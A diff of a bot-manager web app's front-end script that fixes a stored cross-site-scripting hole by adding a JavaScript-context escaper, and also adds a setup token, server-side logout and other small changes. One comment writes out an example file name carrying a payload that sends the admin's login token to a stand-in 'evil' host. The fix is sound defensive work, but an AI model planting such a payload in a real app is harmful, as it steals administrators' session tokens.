@@ -4,7 +4,7 @@
  * Single-page application — no full reloads, async updates only.
  */
 
-// ── Global translation helper ───────────────────────────────
+// -- Global translation helper -------------------------------
 // `t()` is available everywhere in the SPA so individual render functions
 // don't have to redeclare `const t = ...` at the top of every scope. This
 // also eliminates the "t is not defined" crash when a render function is
@@ -20,7 +20,7 @@ window.t = function t(key, params) {
   return (key == null ? '' : String(key));
 };
 
-// ── Global Error Boundary ──────────────────────────────────
+// -- Global Error Boundary ----------------------------------
 // Prevent any uncaught JavaScript error from turning the whole UI
 // into a blank page. Errors are surfaced in a dismissable toast AND
 // rendered inline in the active page so the rest of the app keeps
@@ -78,7 +78,7 @@ window.t = function t(key, params) {
   });
 })();
 
-// ── Global State ───────────────────────────────────────────
+// -- Global State -------------------------------------------
 const App = {
   bots: [],
   systemInfo: null,
@@ -93,12 +93,62 @@ const App = {
   updateAvailable: false,    // Cached for sidebar indicator
 };
 
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 // UTILITIES
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
+// Context-sensitive escaping. Two functions, because HTML and JavaScript
+// are different languages and this app uses both.
+//
+// esc()  — for HTML text nodes and for double-quoted HTML attributes
+//          (title="…", placeholder="…", value="…"). It also escapes '
+//          and ` so a value can never terminate such an attribute.
+//
+// escJs() — REQUIRED inside an inline event handler:
+//
+//            onclick="openFile('${escJs(botName)}','${escJs(item.path)}')"
+//
+//          A browser HTML-DECODES an event-handler attribute value before
+//          compiling it as JavaScript. HTML entity escaping is therefore
+//          NOT enough there: &#39; collapses back to a raw apostrophe, the
+//          JS string literal is terminated early, and the rest of the
+//          value is compiled as code. That is the stored-XSS chain where a
+//          bot plants a file named
+//            x'-fetch('//evil/?t='+localStorage.nbm_token)-'.js
+//          and clicking it hands the admin's own token to a third party.
+//          escJs() backslash-escapes what matters to a JS string literal
+//          and HTML-entities what matters to the attribute parser, so
+//          neither layer can be escaped.
+const ESC_MAP = {
+  '&': '&amp;',
+  '<': '&lt;',
+  '>': '&gt;',
+  '"': '&quot;',
+  "'": '&#39;',
+  '`': '&#96;'
+};
+
 function esc(s) {
-  return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+  return String(s ?? '').replace(/[&<>"'`]/g, (c) => ESC_MAP[c]);
 }
+
+const JS_ESC_MAP = {
+  '\\': '\\\\',
+  "'":  "\\'",
+  '`':  '\\`',
+  '"':  '&quot;',
+  '&':  '&amp;',
+  '<':  '&lt;',
+  '>':  '&gt;',
+  '\n': '\\n',
+  '\r': '\\r',
+  '\u2028': '\\u2028',
+  '\u2029': '\\u2029'
+};
+
+function escJs(s) {
+  return String(s ?? '').replace(/[\\'"`&<>\n\r\u2028\u2029]/g, (c) => JS_ESC_MAP[c]);
+}
+
 
 function fmtUptime(ms) {
   if (!ms) return '—';
@@ -162,9 +212,9 @@ function fileIcon(name) {
   return '<i class="ti ti-file" style="color:var(--tx-3)"></i>';
 }
 
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 // TOAST
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 function toast(type, title, msg = '', duration = 4000) {
   const ICONS = { success:'ti-circle-check', error:'ti-alert-circle', warning:'ti-alert-triangle', info:'ti-info-circle' };
   const el = document.createElement('div');
@@ -175,15 +225,15 @@ function toast(type, title, msg = '', duration = 4000) {
   setTimeout(() => { el.style.cssText += 'opacity:0;transition:opacity 0.3s;'; setTimeout(() => el.remove(), 300); }, duration);
 }
 
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 // CONFIRM DIALOG
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 function confirm(title, msg, onYes, danger = true) {
   const ov = document.createElement('div');
   ov.className = 'modal-overlay';
   ov.innerHTML = `<div class="modal modal-sm">
     <div class="modal-body" style="text-align:center;padding:28px 24px 16px;">
-      <div style="font-size:32px;margin-bottom:12px;">${danger ? '🗑️' : 'ℹ️'}</div>
+      <div style="font-size:32px;margin-bottom:12px;">${danger ? '<i class="ti ti-trash" style="color:var(--red);"></i>' : '<i class="ti ti-info-circle" style="color:var(--blue);"></i>'}</div>
       <div style="font-size:15px;font-weight:600;color:var(--tx-1);margin-bottom:8px;">${esc(title)}</div>
       <div style="font-size:13px;color:var(--tx-3);">${msg}</div>
     </div>
@@ -198,9 +248,9 @@ function confirm(title, msg, onYes, danger = true) {
   ov.onclick = e => { if (e.target === ov) ov.remove(); };
 }
 
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 // ROUTER
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 function navigate(page, params = {}) {
   // Stop any per-page refresh timers
   Object.values(App.refreshTimers).forEach(clearInterval);
@@ -277,9 +327,9 @@ function renderPage(page, params = {}) {
   }
 }
 
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 // AUTH & SETUP
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 async function bootApp() {
   try {
     // Apply translations to the static chrome on first load (sidebar,
@@ -292,7 +342,13 @@ async function bootApp() {
 
     // 1. Check if setup is needed
     const status = await NexusAPI.auth.setupStatus();
-    if (!status.done) { showSetup(); return; }
+    if (!status.done) {
+      // The backend asks for a one-time bootstrap token before it will
+      // create the first admin account.
+      _setupNeedsToken = status.tokenRequired === true;
+      showSetup();
+      return;
+    }
 
     // 2. Check existing token
     const token = NexusAuth.getToken();
@@ -383,7 +439,12 @@ async function doLogin() {
   }
 }
 
-function doLogout() {
+// Server-side logout: revokes the presented token so a stolen copy stops
+// working immediately instead of staying valid for the full 24h window.
+// The local token is cleared either way, so a failed call never leaves the
+// operator stuck on a page they cannot leave.
+async function doLogout() {
+  try { await NexusAPI.auth.logout(); } catch (_) { /* offline / already expired */ }
   NexusAuth.removeToken();
   if (App.socket) { App.socket.disconnect(); App.socket = null; }
   document.getElementById('app').style.display = 'none';
@@ -396,9 +457,13 @@ function updateInstanceName(name) {
   document.title = `${name} — Nexus Bot Manager`;
 }
 
-// ── Setup wizard ──────────────────────────────────────────
+// -- Setup wizard ------------------------------------------
 let _setupData = {};
 let _setupCurrentStep = 1;
+// The backend reports whether POST /auth/setup requires the one-time
+// bootstrap token. An older backend omits the field, so default to hiding
+// it — the wizard stays usable against both.
+let _setupNeedsToken = false;
 
 function setupStep(n) {
   _setupCurrentStep = n;
@@ -416,7 +481,7 @@ function setupStep(n) {
 
   if (prevBtn) prevBtn.style.display = n > 1 ? 'block' : 'none';
   if (nextBtn) nextBtn.textContent = n < 4
-    ? (window.NexusI18n ? NexusI18n.t('common.next') : 'Suivant →')
+    ? (window.NexusI18n ? NexusI18n.t('common.next') : 'Suivant')
     : (window.NexusI18n ? NexusI18n.t('common.finishSetup') : 'Terminer la configuration');
 
   const t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
@@ -425,13 +490,13 @@ function setupStep(n) {
     // Step 1 — Language (FIRST, per spec)
     1: `
       <div style="text-align:center;padding:8px 0 8px;">
-        <div style="font-size:48px;margin-bottom:16px;">🌍</div>
+        <div style="font-size:48px;margin-bottom:16px;"><i class="ti ti-world" style="color:var(--blue);"></i></div>
         <h2 style="font-size:18px;font-weight:700;color:var(--tx-1);margin-bottom:8px;">${t('setup.step1Title')}</h2>
         <p style="color:var(--tx-3);font-size:13px;line-height:1.6;margin-bottom:18px;">${t('setup.step1Hint')}</p>
         <div class="lang-picker" id="setup-lang-picker">
           ${window.NexusI18n.SUPPORTED.map(code => `
             <button type="button" class="lang-pick${NexusI18n.current()===code?' active':''}" data-lang="${code}">
-              <span class="lang-flag">${window.NexusI18n.supportedFlags[code]}</span>
+              <span class="lang-code">${window.NexusI18n.supportedCodes[code]}</span>
               <span class="lang-name">${window.NexusI18n.supportedNames[code]}</span>
             </button>`).join('')}
         </div>
@@ -440,12 +505,19 @@ function setupStep(n) {
     // Step 2 — Welcome (now step 2)
     2: `
       <div style="text-align:center;padding:8px 0 16px;">
-        <div style="font-size:48px;margin-bottom:16px;">🚀</div>
+        <div style="font-size:48px;margin-bottom:16px;"><i class="ti ti-rocket" style="color:var(--blue);"></i></div>
         <h2 style="font-size:18px;font-weight:700;color:var(--tx-1);margin-bottom:8px;">${t('setup.step2Title')}</h2>
         <p style="color:var(--tx-3);font-size:13px;line-height:1.6;">${t('setup.step2Desc')}</p>
         <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:20px;text-align:left;">
-          ${[t('setup.feature1'),t('setup.feature2'),t('setup.feature3'),t('setup.feature4'),t('setup.feature5'),t('setup.feature6')].map(f =>
-            `<div style="display:flex;align-items:center;gap:8px;padding:8px;background:var(--bg-elevated);border-radius:var(--r);font-size:12px;color:var(--tx-2);">${f}</div>`
+          ${[
+            ['ti-server-2', t('setup.feature1')],
+            ['ti-code', t('setup.feature2')],
+            ['ti-activity', t('setup.feature3')],
+            ['ti-shield-lock', t('setup.feature4')],
+            ['ti-archive', t('setup.feature5')],
+            ['ti-template', t('setup.feature6')]
+          ].map(([icon, f]) =>
+            `<div style="display:flex;align-items:center;gap:8px;padding:8px;background:var(--bg-elevated);border-radius:var(--r);font-size:12px;color:var(--tx-2);"><i class="ti ${icon}" style="font-size:15px;color:var(--tx-3);flex:none;"></i><span>${f}</span></div>`
           ).join('')}
         </div>
       </div>`,
@@ -456,7 +528,7 @@ function setupStep(n) {
         <label class="form-label">${t('setup.step3Title')}
           <span class="form-label-hint">${t('settings.instanceHint')}</span>
         </label>
-        <input class="form-control" id="setup-instance" placeholder="${t('setup.step3Placeholder')}" value="${esc(_setupData.instance_name || '')}"/>
+        <input class="form-control" id="setup-instance" maxlength="80" placeholder="${t('setup.step3Placeholder')}" value="${esc(_setupData.instance_name || '')}"/>
         <div class="form-hint"><i class="ti ti-info-circle"></i>${t('setup.step3Hint')}</div>
       </div>`,
 
@@ -464,15 +536,20 @@ function setupStep(n) {
     4: `
       <div class="form-group">
         <label class="form-label">${t('setup.adminUser')}</label>
-        <input class="form-control" id="setup-user" placeholder="${t('setup.adminUserPh')}" value="${esc(_setupData.username || '')}" autocomplete="username"/>
+        <input class="form-control" id="setup-user" maxlength="64" placeholder="${t('setup.adminUserPh')}" value="${esc(_setupData.username || '')}" autocomplete="username"/>
       </div>
       <div class="form-group">
         <label class="form-label">${t('setup.adminPwd')} <span class="form-label-hint">${t('setup.adminPwdHint')}</span></label>
-        <input class="form-control" id="setup-pwd" type="password" autocomplete="new-password"/>
+        <input class="form-control" id="setup-pwd" type="password" maxlength="72" autocomplete="new-password"/>
       </div>
       <div class="form-group">
         <label class="form-label">${t('setup.adminPwd2')}</label>
-        <input class="form-control" id="setup-pwd2" type="password" autocomplete="new-password"/>
+        <input class="form-control" id="setup-pwd2" type="password" maxlength="72" autocomplete="new-password"/>
+      </div>
+      <div class="form-group"${_setupNeedsToken ? '' : ' style="display:none;"'}>
+        <label class="form-label">${t('setup.tokenTitle') || 'Setup token'}</label>
+        <input class="form-control" id="setup-token" placeholder="${t('setup.tokenPh') || 'Paste the token printed in the server console'}" value="${esc(_setupData.setup_token || '')}" autocomplete="off"/>
+        <div class="form-hint"><i class="ti ti-info-circle"></i>${t('setup.tokenHint') || 'Printed at server startup and stored in backend/data/setup-token (mode 0600).'}</div>
       </div>
       <div id="setup-err" style="display:none;" class="form-error"></div>`,
   };
@@ -534,10 +611,13 @@ async function setupNext() {
     const username = document.getElementById('setup-user')?.value?.trim();
     const password = document.getElementById('setup-pwd')?.value;
     const confirm2 = document.getElementById('setup-pwd2')?.value;
+    const setupToken = document.getElementById('setup-token')?.value?.trim() || '';
     const errEl    = document.getElementById('setup-err');
 
+    if (_setupNeedsToken && !setupToken) { errEl.textContent = t('setup.errTokenMissing') || 'Setup token is required'; errEl.style.display = 'block'; return; }
     if (!username || username.length < 3) { errEl.textContent = t('setup.errUserShort'); errEl.style.display = 'block'; return; }
-    if (!password || password.length < 6) { errEl.textContent = t('setup.errPwdShort'); errEl.style.display = 'block'; return; }
+    // Must match the backend's MIN_PASSWORD_LENGTH (auth.js).
+    if (!password || password.length < 8) { errEl.textContent = t('setup.errPwdShort'); errEl.style.display = 'block'; return; }
     if (password !== confirm2)            { errEl.textContent = t('setup.errPwdMismatch'); errEl.style.display = 'block'; return; }
 
     errEl.style.display = 'none';
@@ -550,7 +630,7 @@ async function setupNext() {
         instance_name: _setupData.instance_name,
         username, password,
         language: NexusI18n ? NexusI18n.current() : 'en'
-      });
+      }, setupToken ? { headers: { 'X-Setup-Token': setupToken } } : {});
       NexusAuth.setToken(data.token);
       NexusAuth.setUser(data);
       App.instanceName = data.instance_name;
@@ -577,9 +657,9 @@ function setupPrev() {
   if (_setupCurrentStep > 1) setupStep(_setupCurrentStep - 1);
 }
 
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 // SOCKET.IO — Real-time status
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 function initSocket() {
   if (typeof io === 'undefined' || App.socket) return;
   try {
@@ -631,9 +711,9 @@ function updateConnStatus(connected) {
   }
 }
 
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 // DASHBOARD
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 async function loadDashboard() {
   const t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
   const page = document.getElementById('page-dashboard');
@@ -787,9 +867,9 @@ function filterDash(filter, btn) {
   if (el) el.innerHTML = renderBotsTable(list);
 }
 
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 // BOTS TABLE (reusable)
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 function renderBotsTable(bots) {
   const t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
   if (!bots || bots.length === 0) {
@@ -805,7 +885,7 @@ function renderBotsTable(bots) {
     const [bg, color] = botColor(bot.name);
     const pm2 = App.pm2StatusMap[bot.name] || bot.pm2;
     const isOnline = pm2?.status === 'online';
-    return `<tr data-bot-row="${esc(bot.name)}" onclick="navigate('bot',{botName:'${esc(bot.name)}'})">
+    return `<tr data-bot-row="${esc(bot.name)}" onclick="navigate('bot',{botName:'${escJs(bot.name)}'})">
       <td style="width:32px;padding:10px 8px 10px 14px;">
         <div class="bot-av" style="background:${bg};color:${color};">${botInitials(bot.name)}</div>
       </td>
@@ -820,13 +900,13 @@ function renderBotsTable(bots) {
       <td onclick="event.stopPropagation()">
         <div class="act-group">
           ${isOnline
-            ? `<button class="act-btn act-stop" title="${esc(t('actionTitle.stop'))}"     onclick="botAction('stop','${esc(bot.name)}',this)"><i class="ti ti-player-pause"></i></button>
-               <button class="act-btn"          title="${esc(t('actionTitle.restart'))}"  onclick="botAction('restart','${esc(bot.name)}',this)"><i class="ti ti-refresh"></i></button>`
-            : `<button class="act-btn act-start" title="${esc(t('actionTitle.start'))}"   onclick="botAction('start','${esc(bot.name)}',this)"><i class="ti ti-player-play"></i></button>`
+            ? `<button class="act-btn act-stop" title="${esc(t('actionTitle.stop'))}"     onclick="botAction('stop','${escJs(bot.name)}',this)"><i class="ti ti-player-pause"></i></button>
+               <button class="act-btn"          title="${esc(t('actionTitle.restart'))}"  onclick="botAction('restart','${escJs(bot.name)}',this)"><i class="ti ti-refresh"></i></button>`
+            : `<button class="act-btn act-start" title="${esc(t('actionTitle.start'))}"   onclick="botAction('start','${escJs(bot.name)}',this)"><i class="ti ti-player-play"></i></button>`
           }
-          <button class="act-btn act-edit"   title="${esc(t('actionTitle.logs'))}"  onclick="navigate('logs',{botName:'${esc(bot.name)}'})"><i class="ti ti-terminal"></i></button>
-          <button class="act-btn act-edit"   title="${esc(t('actionTitle.open'))}"  onclick="navigate('editor',{botName:'${esc(bot.name)}'})"><i class="ti ti-code"></i></button>
-          <button class="act-btn act-danger" title="${esc(t('actionTitle.delete'))}" onclick="confirmDelete('${esc(bot.name)}')"><i class="ti ti-trash"></i></button>
+          <button class="act-btn act-edit"   title="${esc(t('actionTitle.logs'))}"  onclick="navigate('logs',{botName:'${escJs(bot.name)}'})"><i class="ti ti-terminal"></i></button>
+          <button class="act-btn act-edit"   title="${esc(t('actionTitle.open'))}"  onclick="navigate('editor',{botName:'${escJs(bot.name)}'})"><i class="ti ti-code"></i></button>
+          <button class="act-btn act-danger" title="${esc(t('actionTitle.delete'))}" onclick="confirmDelete('${escJs(bot.name)}')"><i class="ti ti-trash"></i></button>
         </div>
       </td>
     </tr>`;
@@ -838,9 +918,9 @@ function renderBotsTable(bots) {
   </table>`;
 }
 
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 // BOT ACTIONS — No page reload, patch UI only
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 async function botAction(action, botName, btn) {
   const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
   if (btn) { btn.disabled = true; btn.innerHTML = '<div class="spinner spinner-sm"></div>'; }
@@ -869,13 +949,13 @@ async function botAction(action, botName, btn) {
               const groupHtml = `
                 <div class="flex gap-6">
                   ${isOnline
-                    ? `<button class="btn btn-ghost btn-sm" data-bot-act="restart" onclick="botAction('restart','${esc(botName)}',this)"><i class="ti ti-refresh"></i>${esc(_t('actionTitle.restart'))}</button>
-                       <button class="btn btn-danger btn-sm" data-bot-act="stop" onclick="botAction('stop','${esc(botName)}',this)"><i class="ti ti-player-pause"></i>${esc(_t('actionTitle.stop'))}</button>`
-                    : `<button class="btn btn-success btn-sm" data-bot-act="start" onclick="botAction('start','${esc(botName)}',this)"><i class="ti ti-player-play"></i>${esc(_t('actionTitle.start'))}</button>`
+                    ? `<button class="btn btn-ghost btn-sm" data-bot-act="restart" onclick="botAction('restart','${escJs(botName)}',this)"><i class="ti ti-refresh"></i>${esc(_t('actionTitle.restart'))}</button>
+                       <button class="btn btn-danger btn-sm" data-bot-act="stop" onclick="botAction('stop','${escJs(botName)}',this)"><i class="ti ti-player-pause"></i>${esc(_t('actionTitle.stop'))}</button>`
+                    : `<button class="btn btn-success btn-sm" data-bot-act="start" onclick="botAction('start','${escJs(botName)}',this)"><i class="ti ti-player-play"></i>${esc(_t('actionTitle.start'))}</button>`
                   }
-                  <button class="btn btn-ghost btn-sm" onclick="navigate('editor',{botName:'${esc(botName)}'})"><i class="ti ti-code"></i>${esc(_t('actionTitle.open'))}</button>
-                  <button class="btn btn-ghost btn-sm" onclick="exportBot('${esc(botName)}')"><i class="ti ti-archive"></i>${esc(_t('backups.export') || _t('common.download'))}</button>
-                  <button class="btn btn-danger btn-sm btn-icon" onclick="confirmDelete('${esc(botName)}')" title="${esc(_t('actionTitle.delete'))}"><i class="ti ti-trash"></i></button>
+                  <button class="btn btn-ghost btn-sm" onclick="navigate('editor',{botName:'${escJs(botName)}'})"><i class="ti ti-code"></i>${esc(_t('actionTitle.open'))}</button>
+                  <button class="btn btn-ghost btn-sm" onclick="exportBot('${escJs(botName)}')"><i class="ti ti-archive"></i>${esc(_t('backups.export') || _t('common.download'))}</button>
+                  <button class="btn btn-danger btn-sm btn-icon" onclick="confirmDelete('${escJs(botName)}')" title="${esc(_t('actionTitle.delete'))}"><i class="ti ti-trash"></i></button>
                 </div>`;
               const group = detailCard.querySelector('.flex.gap-6');
               if (group) group.outerHTML = groupHtml;
@@ -886,9 +966,9 @@ async function botAction(action, botName, btn) {
           document.querySelectorAll(`tr[data-bot-row="${botName}"] .act-group`).forEach(group => {
             // Find this row's act-group and replace just the start/stop/restart trio
             const newHtml = isOnline
-              ? `<button class="act-btn act-stop" title="${esc(_t('actionTitle.stop'))}"     onclick="botAction('stop','${esc(botName)}',this)"><i class="ti ti-player-pause"></i></button>
-                 <button class="act-btn"          title="${esc(_t('actionTitle.restart'))}"  onclick="botAction('restart','${esc(botName)}',this)"><i class="ti ti-refresh"></i></button>`
-              : `<button class="act-btn act-start" title="${esc(_t('actionTitle.start'))}"   onclick="botAction('start','${esc(botName)}',this)"><i class="ti ti-player-play"></i></button>`;
+              ? `<button class="act-btn act-stop" title="${esc(_t('actionTitle.stop'))}"     onclick="botAction('stop','${escJs(botName)}',this)"><i class="ti ti-player-pause"></i></button>
+                 <button class="act-btn"          title="${esc(_t('actionTitle.restart'))}"  onclick="botAction('restart','${escJs(botName)}',this)"><i class="ti ti-refresh"></i></button>`
+              : `<button class="act-btn act-start" title="${esc(_t('actionTitle.start'))}"   onclick="botAction('start','${escJs(botName)}',this)"><i class="ti ti-player-play"></i></button>`;
             // Replace first 2 children (start/stop/restart buttons) without touching the rest
             const wrap = document.createElement('div');
             wrap.innerHTML = newHtml;
@@ -929,9 +1009,9 @@ function confirmDelete(botName) {
   );
 }
 
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 // BOTS LIST
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 async function loadBotsList() {
   const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
   const page = document.getElementById('page-bots');
@@ -992,9 +1072,9 @@ function filterBotsTab(filter, btn) {
   if (el) el.innerHTML = renderBotsTable(list);
 }
 
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 // BOT DETAIL
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 async function loadBotDetail(botName) {
   const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
   const page = document.getElementById('page-bot');
@@ -1018,13 +1098,13 @@ async function loadBotDetail(botName) {
           </div>
           <div class="flex gap-6">
             ${isOnline
-              ? `<button class="btn btn-ghost btn-sm" onclick="botAction('restart','${esc(botName)}',this)"><i class="ti ti-refresh"></i>${esc(_t('actionTitle.restart'))}</button>
-                 <button class="btn btn-danger btn-sm" onclick="botAction('stop','${esc(botName)}',this)"><i class="ti ti-player-pause"></i>${esc(_t('actionTitle.stop'))}</button>`
-              : `<button class="btn btn-success btn-sm" onclick="botAction('start','${esc(botName)}',this)"><i class="ti ti-player-play"></i>${esc(_t('actionTitle.start'))}</button>`
+              ? `<button class="btn btn-ghost btn-sm" onclick="botAction('restart','${escJs(botName)}',this)"><i class="ti ti-refresh"></i>${esc(_t('actionTitle.restart'))}</button>
+                 <button class="btn btn-danger btn-sm" onclick="botAction('stop','${escJs(botName)}',this)"><i class="ti ti-player-pause"></i>${esc(_t('actionTitle.stop'))}</button>`
+              : `<button class="btn btn-success btn-sm" onclick="botAction('start','${escJs(botName)}',this)"><i class="ti ti-player-play"></i>${esc(_t('actionTitle.start'))}</button>`
             }
-            <button class="btn btn-ghost btn-sm" onclick="navigate('editor',{botName:'${esc(botName)}'})"><i class="ti ti-code"></i>${esc(_t('actionTitle.open'))}</button>
-            <button class="btn btn-ghost btn-sm" onclick="exportBot('${esc(botName)}')"><i class="ti ti-archive"></i>${esc(_t('backups.export') || _t('common.download'))}</button>
-            <button class="btn btn-danger btn-sm btn-icon" onclick="confirmDelete('${esc(botName)}')" title="${esc(_t('actionTitle.delete'))}"><i class="ti ti-trash"></i></button>
+            <button class="btn btn-ghost btn-sm" onclick="navigate('editor',{botName:'${escJs(botName)}'})"><i class="ti ti-code"></i>${esc(_t('actionTitle.open'))}</button>
+            <button class="btn btn-ghost btn-sm" onclick="exportBot('${escJs(botName)}')"><i class="ti ti-archive"></i>${esc(_t('backups.export') || _t('common.download'))}</button>
+            <button class="btn btn-danger btn-sm btn-icon" onclick="confirmDelete('${escJs(botName)}')" title="${esc(_t('actionTitle.delete'))}"><i class="ti ti-trash"></i></button>
           </div>
         </div>
       </div>
@@ -1055,7 +1135,7 @@ async function loadBotDetail(botName) {
         <!-- Dependencies -->
         <div class="card">
           <div class="card-header"><span class="card-title"><i class="ti ti-package"></i>${esc(_t('botDetail.dependencies'))}</span>
-            <button class="btn btn-ghost btn-xs" onclick="navigate('npm',{botName:'${esc(botName)}'})">${esc(_t('botDetail.manage'))}</button>
+            <button class="btn btn-ghost btn-xs" onclick="navigate('npm',{botName:'${escJs(botName)}'})">${esc(_t('botDetail.manage'))}</button>
           </div>
           <div class="card-body">
             ${bot.packageJson?.dependencies
@@ -1077,7 +1157,7 @@ async function loadBotDetail(botName) {
               <button class="tab-btn active" onclick="switchTab('stdout','stderr',this)">${esc(_t('botDetail.stdout'))}</button>
               <button class="tab-btn" onclick="switchTab('stderr','stdout',this)">${esc(_t('botDetail.stderr'))}</button>
             </div>
-            <button class="btn btn-ghost btn-xs" onclick="loadBotLogs('${esc(botName)}')"><i class="ti ti-refresh"></i></button>
+            <button class="btn btn-ghost btn-xs" onclick="loadBotLogs('${escJs(botName)}')"><i class="ti ti-refresh"></i></button>
           </div>
         </div>
         <div id="stdout" style="background:var(--bg-base);border-radius:0 0 10px 10px;min-height:200px;max-height:300px;overflow-y:auto;padding:4px 0;">
@@ -1141,13 +1221,13 @@ function logLine(l) {
   let cls = 'log-out';
   if (/error|err|fatal/i.test(l)) cls = 'log-err';
   else if (/warn/i.test(l))       cls = 'log-warn';
-  else if (/✅|connecté|ready/i.test(l)) cls = 'log-ok';
+  else if (/connecté|connecte|prêt|pret|ready|actif|active|démarré|demarre|started|en ligne|online/i.test(l)) cls = 'log-ok';
   return `<div class="log-line"><span class="${cls}">${esc(l)}</span></div>`;
 }
 
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 // NEW BOT — 3-step wizard
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 // The AI prompt body is fully localized through the i18n system.
 // `prompt.template` exists in en/fr/de and is fetched lazily via t() so
 // language changes are reflected immediately without a full re-render
@@ -1264,7 +1344,7 @@ function nbStep(n) {
           const diffLabel = t('newBotPage.' + diffKey);
           const diffColor = diffKey === 'beginner' ? 'green' : diffKey === 'intermediate' ? 'amber' : 'red';
           return `
-          <div class="tpl-card ${tpl.id === _newBot.templateId ? 'selected' : ''}" onclick="selectTpl('${esc(tpl.id)}')" id="tpl-${esc(tpl.id)}">
+          <div class="tpl-card ${tpl.id === _newBot.templateId ? 'selected' : ''}" onclick="selectTpl('${escJs(tpl.id)}')" id="tpl-${esc(tpl.id)}">
             <div class="tpl-head">
               <i class="ti ${tpl.icon} tpl-icon"></i>
               <span class="tpl-badge" style="color:var(--${diffColor});border-color:var(--${diffColor}-b);background:var(--${diffColor}-bg);">${esc(diffLabel)}</span>
@@ -1299,7 +1379,7 @@ function nbStep(n) {
         <div class="lang-picker" id="newbot-lang-picker">
           ${window.NexusI18n ? window.NexusI18n.SUPPORTED.map(code => `
             <button type="button" class="lang-pick${(_newBot.botLanguage || NexusI18n.current())===code?' active':''}" data-botlang="${code}">
-              <span class="lang-flag">${window.NexusI18n.supportedFlags[code]}</span>
+              <span class="lang-code">${window.NexusI18n.supportedCodes[code]}</span>
               <span class="lang-name">${window.NexusI18n.supportedNames[code]}</span>
             </button>`).join('') : ''}
         </div>
@@ -1484,9 +1564,9 @@ async function nbNext() {
   }
 }
 
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 // TEMPLATES PAGE
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 async function loadTemplates() {
   const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
   const page = document.getElementById('page-templates');
@@ -1508,7 +1588,7 @@ async function loadTemplates() {
 
       <div class="flex gap-8 mb-16" id="tpl-cats">
         <button class="tab-btn active" onclick="filterTplCat('',this)">${esc(_t('templatesPage.all', { n: templates.length }))}</button>
-        ${categories.map(c => `<button class="tab-btn" onclick="filterTplCat('${esc(c.id)}',this)">${esc(c.label)} (${c.count})</button>`).join('')}
+        ${categories.map(c => `<button class="tab-btn" onclick="filterTplCat('${escJs(c.id)}',this)">${esc(c.label)} (${c.count})</button>`).join('')}
       </div>
 
       <div class="tpl-lib-grid" id="tpl-lib-grid">
@@ -1533,7 +1613,7 @@ function renderTplCards(templates) {
     const diffLabel = _t('newBotPage.' + diffKey);
     const diffColor = diffKey === 'beginner' ? 'green' : diffKey === 'intermediate' ? 'amber' : 'red';
     return `
-    <div class="tpl-lib-card" onclick="useTpl('${esc(t.id)}')">
+    <div class="tpl-lib-card" onclick="useTpl('${escJs(t.id)}')">
       <div class="lib-icon"><i class="ti ${t.icon}" style="color:var(--blue)"></i></div>
       <div class="lib-name">${esc(t.name)}</div>
       <div class="lib-desc">${esc(t.description)}</div>
@@ -1573,9 +1653,9 @@ function useTpl(id) {
   setTimeout(() => selectTpl(id), 100);
 }
 
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 // LOGS PAGE
-// ════════════════════════════════════════════════════════════
+// ------------------------------------------------------------
 async function loadLogs(botName) {
   const t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
   const page = document.getElementById('page-logs');
@@ -1621,8 +1701,8 @@ async function loadLogs(botName) {
               <div class="err-panel-title"><i class="ti ti-alert-circle"></i> PM2 ${esc(t('errors.generic'))} — ${esc(b.name)}</div>
               <div class="err-line">${esc(t('errors.tokenInvalidHint'))}</div>
               <div class="flex gap-6 mt-8">
-                <button class="btn btn-ghost btn-sm" onclick="navigate('editor',{botName:'${esc(b.name)}'})"><i class="ti ti-code"></i> ${esc(t('actionTitle.open'))}</button>
-                <button class="btn btn-primary btn-sm" onclick="botAction('restart','${esc(b.name)}',this)"><i class="ti ti-refresh"></i> ${esc(t('actionTitle.restart'))}</button>
+                <button class="btn btn-ghost btn-sm" onclick="navigate('editor',{botName:'${escJs(b.name)}'})"><i class="ti ti-code"></i> ${esc(t('actionTitle.open'))}</button>
+                <button class="btn btn-primary btn-sm" onclick="botAction('restart','${escJs(b.name)}',this)"><i class="ti ti-refresh"></i> ${esc(t('actionTitle.restart'))}</button>
               </div>
             </div>`).join('')}
         </div>` : ''}
